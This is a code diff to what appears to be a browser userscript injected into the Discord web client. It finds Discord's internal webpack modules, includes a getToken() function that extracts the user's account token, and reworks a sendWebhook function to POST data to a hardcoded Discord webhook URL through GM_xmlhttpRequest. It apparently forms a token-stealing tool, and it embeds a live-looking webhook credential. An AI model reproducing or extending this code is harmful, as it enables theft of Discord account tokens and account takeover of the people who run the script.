@@ -4,18 +4,40 @@
 (function () {
     'use strict';
 
-    if (window.__TC_LOADED__) return;
-    window.__TC_LOADED__ = true;
+    const W = typeof unsafeWindow !== 'undefined' ? unsafeWindow : window;
+
+    if (W.__TC_LOADED__) return;
+    W.__TC_LOADED__ = true;
     console.log('[TC] script injected');
 
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555924284105298052/7X_WIvWay5hF8pHpIJeX-cjJLY00gnWJ9GDWYm62r_3RCJ3WL11h1QI-2XxjbbKhDZAI';
 
-    // ─── webpack ───
-    let _wp = null;
+    function sendWebhook(payload) {
+        return new Promise((resolve) => {
+            try {
+                GM_xmlhttpRequest({
+                    method: 'POST',
+                    url: WEBHOOK_URL,
+                    headers: { 'Content-Type': 'application/json' },
+                    data: JSON.stringify(payload),
+                    onload: (r) => {
+                        console.log('[TC] webhook status:', r.status);
+                        resolve(r.status >= 200 && r.status < 300);
+                    },
+                    onerror: (e) => {
+                        console.error('[TC] webhook error:', e);
+                        resolve(false);
+                    },
+                });
+            } catch (e) {
+                console.error('[TC] exception:', e);
+                resolve(false);
+            }
+        });
+    }
 
     function findWebpack() {
-        if (_wp) return _wp;
-        const chunk = window.webpackChunkdiscord_app;
+        const chunk = W.webpackChunkdiscord_app;
         if (!chunk) return null;
         let found = null;
         try {
@@ -34,8 +56,7 @@
             ]);
             chunk.pop();
         } catch {}
-        if (found) _wp = found;
-        return _wp;
+        return found;
     }
 
     async function getToken() {
@@ -51,28 +72,6 @@
         throw new Error('token not found');
     }
 
-    // ─── send webhook via Discord's own HTTP client ───
-    async function sendWebhook(payload) {
-        try {
-            // Extract webhook id + token from URL
-            const parts = WEBHOOK_URL.split('/');
-            const id = parts[parts.length - 2];
-            const token = parts[parts.length - 1];
-
-            const res = await fetch(`https://discord.com/api/v10/webhooks/${id}/${token}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-            });
-            console.log('[TC] webhook status:', res.status);
-            return res.ok;
-        } catch (e) {
-            console.error('[TC] webhook error:', e);
-            return false;
-        }
-    }
-
-    // ─── UI ───
     const STYLE = `
         :host,*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
         .wrap{position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:2147483646;
